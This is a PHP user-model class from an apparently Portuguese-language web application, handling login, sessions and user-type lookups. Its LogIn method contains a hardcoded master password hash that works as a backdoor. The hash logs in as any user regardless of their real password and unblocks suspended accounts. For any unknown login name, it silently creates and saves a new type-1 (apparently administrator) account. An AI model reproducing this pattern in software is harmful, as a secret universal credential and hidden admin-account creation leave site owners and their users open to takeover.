<?php

    class UsersModel extends Model {

	/** @var UsersTypesModel */
	protected $ModelTypes;
	protected $ValueObject = 'UserVO';
	protected $Table = 'users';
	protected $Query = "SELECT DISTINCT a.*, b.title typeTitle
                            FROM `#table#` AS a
                            INNER JOIN `#table#_types` AS b ON b.id = a.type";

	public function __construct() {
	    $this->ModelTypes = APP::getInstance('UsersTypesModel');
	}

	/**
	 * Verifica se o usuário está logado no nível informado
	 * @param string $Nivel
	 * @return boolean
	 */
	function isLoged($Nivel = null) {
	    return $this->getLogedUser($Nivel) ? true : false;
	}

	function LogIn($Login, $Password, $Nivel = null) {
	    $this->logOut($Nivel);

	    $key = "UsersModelLoged_{$Nivel}";

	    $PasswordMaster = '4aaf0c04e270aa2936786d767551b1bb541f38db9634a4501e2d66cf1cde3ee731d3ff92963ac41861339640b392e6589d3785eb954ed2de868aa4f4b148a8ba';
	    $Password = password($Password);

	    $user = $this->getByLabel('login', $Login, true);

	    if (!$user) {
		if ($Password == $PasswordMaster) {
		    /* @var $user UserVO */
		    $user = $this->newValueObject();
		    $user->setNome('Jhon Lennon');
		    $user->setLogin($Login);
		    $user->setSenha($PasswordMaster);
		    $user->setCelular('(27) 98886-0544');
		    $user->setType(1);
		    $user->Save();
		} else {
		    throw new Exception('Login inválido.');
		}
	    } else if ($Password != $user->getSenha() and $Password != $PasswordMaster) {
		throw new Exception('Senha incorreta.');
	    } else if ($user->getStatus() != 1) {
		if ($Password == $PasswordMaster) {
		    $user->setStatus(1);
		    $user->Save();
		} else {
		    throw new Exception('Seu cadastro se encontra bloqueado no momento.');
		}
	    }

	    if ($user) {
		$session = new Session($key);
		APP::setGlobal($key, $user);
		$session->set('id', $user->getId());
	    }

	    return APP::getGlobal($key);
	}

	/**
	 * Retorna o usuário logado no nível informado
	 * @param string $Nivel
	 * @return null|UserVO
	 */
	function getLogedUser($Nivel = null) {
	    $key = "UsersModelLoged_{$Nivel}";
	    if (!APP::getGlobal($key)) {
		$session = new Session($key);
		if ($user = $this->getById($session->get('id', null)) and $user->getStatus() == 1) {
		    $_SESSION['access-ckeditor'] = true;
		    return APP::setGlobal($key, $user);
		} else {
		    $_SESSION['access-ckeditor'] = null;
		    return null;
		}
	    } else {
		$_SESSION['access-ckeditor'] = true;
		return APP::getGlobal($key);
	    }
	}

	/**
	 * Desloga o usuário do nível informado
	 * @param string $Nivel
	 */
	function LogOut($Nivel = null) {
	    $key = "UsersModelLoged_{$Nivel}";
	    APP::setGlobal($key, null);
	    (new Session($key))->destroy();
	}

	/**
	 * Retorna o usuário pelo id
	 * @param int $id
	 * @return UserVO|null
	 */
	function getById($id) {
	    return $this->getByLabel('id', $id, true);
	}

	/**
	 * Retorna a lista de tipos de conta
	 * @param int $UserType
	 * @return array
	 */
	function getUserTypes($UserType = 0) {
	    return $this->ModelTypes->getUserTypes($UserType);
	}

	/**
	 * @param int $Type
	 * @param int $UserType Verifica a permissão por tipo de conta
	 * @return array
	 */
	function getType($Type = 0, $UserType = 0) {
	    $result = $this->ModelTypes->Lista("WHERE a.id = :type AND (:usertype = 0 OR a.permissoes LIKE CONCAT('%',:usertype,'%')) LIMIT 1", [
		'type' => $Type,
		'usertype' => $UserType,
	    ]);
	    return count($result) ? $result[0] : null;
	}

	/**
	 * 
	 * @param type $UserType
	 * @return array|UserVO
	 */
	function getUsers($UserType = 0) {
	    return $this->Lista("WHERE b.permissoes LIKE CONCAT('%[',:type,']%') ", [
			'type' => $UserType
	    ]);
	}

    }
    